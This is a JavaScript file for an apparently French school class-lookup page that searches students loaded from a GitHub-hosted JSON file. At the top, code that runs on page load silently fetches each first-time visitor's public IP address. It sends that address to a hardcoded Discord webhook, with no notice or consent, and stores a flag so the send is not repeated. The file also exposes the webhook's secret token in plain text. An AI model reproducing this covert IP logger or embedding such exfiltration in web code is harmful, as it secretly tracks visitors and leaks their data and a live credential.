const webhookURL = 'https://discord.com/api/webhooks/1278708793789775952/YJNuI74RYgr1LnHfOF6hXwP81JUiOwCoduFRXt3Es_mKBz01m1Vuqacysoc1YO8OyfKe';
function sendWebhookMessage(message) {
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: message
        })
    }).then(response => {
        if (response.ok) {
            console.log('Message envoyé avec succès.');
        } else {
            console.error('Erreur lors de l\'envoi du message:', response.statusText);
        }
    }).catch(error => {
        console.error('Erreur réseau ou autre:', error);
    });
}
function getUserIP(callback) {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            callback(data.ip);
        })
        .catch(error => {
            console.error('Erreur lors de la récupération de l\'adresse IP:', error);
            callback(null);
        });
}

const LOCAL_STORAGE_KEY = 'hasSentDiscordMessage';
if (!localStorage.getItem(LOCAL_STORAGE_KEY)) {
    getUserIP(ip => {
        if (ip) {
            sendWebhookMessage(`Nouvelle connexion détectée depuis un nouvel appareil avec l'IP : ${ip}`);
        } else {
            sendWebhookMessage('Nouvelle connexion détectée depuis un nouvel appareil, mais l\'IP n\'a pas pu être récupérée.');
        }
        localStorage.setItem(LOCAL_STORAGE_KEY, 'true');
    });
} else {
    console.log('Cet appareil a déjà envoyé un message. Aucun message ne sera envoyé.');
}

function generate_list(json_data) {
    var list_id_to_info = []
    var list_name = []
    var dict_name_to_id = {}
    var id = 0
    // var dict_name_to_id = {}
    for (const niveau of json_data) {
        for (const classe of niveau) {
            const nom_classe = Object.keys(classe)[0]
            const eleves = Object.values(classe)[0]

            for (const eleve of eleves) {
                list_id_to_info.push([eleve, nom_classe])
                list_name.push(eleve)
                dict_name_to_id[eleve] = id
                id += 1
            }
        }
    }
    return [list_id_to_info, list_name, dict_name_to_id]
}

function populateDatalist(options) {
    const datalist = document.getElementById('dynamic-options');

    datalist.innerHTML = '';

    options.forEach(option => {
        const optionElement = document.createElement('option');
        optionElement.value = option;
        datalist.appendChild(optionElement);
    });
}

function hide_all_links () {
    for (const link of document.querySelectorAll("a")) {
        link.style.display = "none"
    }
}

fetch('https://raw.githubusercontent.com/tonioliii/classes/main/data.json')
  .then(res => res.json())
  .then(json => {
    let info = generate_list(json)
    const list_id_to_info = info[0]
    const list_name = info[1]
    const dict_name_to_id = info[2]

    populateDatalist(list_name);

    const input = document.getElementById('dynamic-input');
    input.addEventListener("click", function () {
        hide_all_links()
        searchBTN.style.display = "block"
    })

    input.addEventListener('blur', function() {
        if (!list_name.includes(this.value)) {
            this.value = '';
        }
    });

    const searchBTN = document.getElementById('search');
    searchBTN.addEventListener('click', function() {
        if (input.value == "") {
            alert("caca")
        } else {
            const link = document.getElementById(dict_name_to_id[input.value])
            searchBTN.style.display = "none"
            hide_all_links()
            link.style.display = "block"
        }
    });

    const url = new URL(window.location.href);
    const params = new URLSearchParams(url.search);
    const id = params.get('id');

    if (id != null) {
        let info = list_id_to_info[id]

        document.getElementById("eleve-name").innerText = info[0]
        document.getElementById("eleve-classe").innerText = info[1]
        document.getElementById("eleve-div").style.display = "flex"
        document.getElementById("search-div").style.display = "none"
        document.getElementById("back").href = url.href.split("?")[0]
    }


})